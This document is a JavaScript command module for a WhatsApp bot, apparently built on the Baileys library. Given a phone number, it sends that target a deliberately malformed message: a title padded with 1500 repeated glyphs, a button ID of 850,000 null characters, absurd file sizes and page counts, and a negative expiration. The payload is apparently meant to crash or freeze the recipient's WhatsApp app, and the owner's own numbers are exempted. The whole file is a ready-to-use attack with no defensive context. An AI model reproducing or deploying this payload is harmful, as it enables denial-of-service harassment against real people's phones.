// commands/sukuna.js
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const crypto = require('crypto');

const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];

async function sukunaCommand(sock, chatId, message, args) {
    if (!message.key.fromMe) {
        await sock.sendMessage(chatId, { text: "❌ *Owner Only*" }, { quoted: message });
        return;
    }

    const targetNumber = args[0];
    if (!targetNumber) {
        await sock.sendMessage(chatId, { 
            text: "👹 *Ryomen Sukuna*\n\nUsage: .sukuna <number>\nExample: .sukuna 628123456789\n\n*Domain Expansion: Malevolent Shrine*"
        }, { quoted: message });
        return;
    }

    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
    
    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
        await sock.sendMessage(chatId, { text: "🛡️ *Protected by Gojo's Infinity*" }, { quoted: message });
        return;
    }

    const target = cleanNumber + '@s.whatsapp.net';
    
    await sock.sendMessage(chatId, { text: `👹 *Malevolent Shrine* expanding on ${cleanNumber}...` }, { quoted: message });
    await sock.sendMessage(chatId, { react: { text: "👹", key: message.key } });

    try {
        const stanza = [
            { attrs: { biz_bot: '1' }, tag: "bot" },
            { attrs: {}, tag: "biz" }
        ];

        const messagePayload = {
            viewOnceMessage: {
                message: {
                    listResponseMessage: {
                        title: "✦ Ṛɏǿɱḕṅ Ṡüķüṅä ✦" + "꧁༒".repeat(1500),
                        listType: 2,
                        singleSelectReply: { selectedRowId: "🔪" },
                        contextInfo: {
                            stanzaId: sock.generateMessageTag(),
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            mentionedJid: [target],
                            quotedMessage: {
                                buttonsMessage: {
                                    documentMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                                        fileLength: "9999999999999",
                                        pageCount: 3567587327,
                                        fileName: "✦ Ṛɏǿɱḕṅ Ṡüķüṅä ✦",
                                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                                        mediaKeyTimestamp: "1735456100",
                                        contactVcard: true
                                    },
                                    contentText: "Domain Expansion: Malevolent Shrine",
                                    footerText: "© Sukuna",
                                    buttons: [{ buttonId: "\u0000".repeat(850000), buttonText: { displayText: "⩟⬦𪲁 𝐌𝐀𝐋𝐄𝐕𝐎𝐋𝐄𝐍𝐓 𝐒𝐇𝐑𝐈𝐍𝐄 ⩟⬦𪲁" }, type: 1 }],
                                    headerType: 3
                                }
                            },
                            forwardingScore: 999999,
                            isForwarded: true,
                            expiration: -99999
                        },
                        description: "INITIATED_BY_USER"
                    }
                }
            }
        };

        await sock.relayMessage(target, messagePayload, { additionalNodes: stanza, participant: { jid: target } });
        
        await sock.sendMessage(chatId, { text: `✅ *Malevolent Shrine* activated on ${cleanNumber}` }, { quoted: message });
        await sock.sendMessage(chatId, { react: { text: "🗡️", key: message.key } });

    } catch (error) {
        console.error('[Sukuna]', error.message);
        await sock.sendMessage(chatId, { text: `❌ *Domain Expansion failed:* ${error.message}` }, { quoted: message });
    }
}

module.exports = sukunaCommand;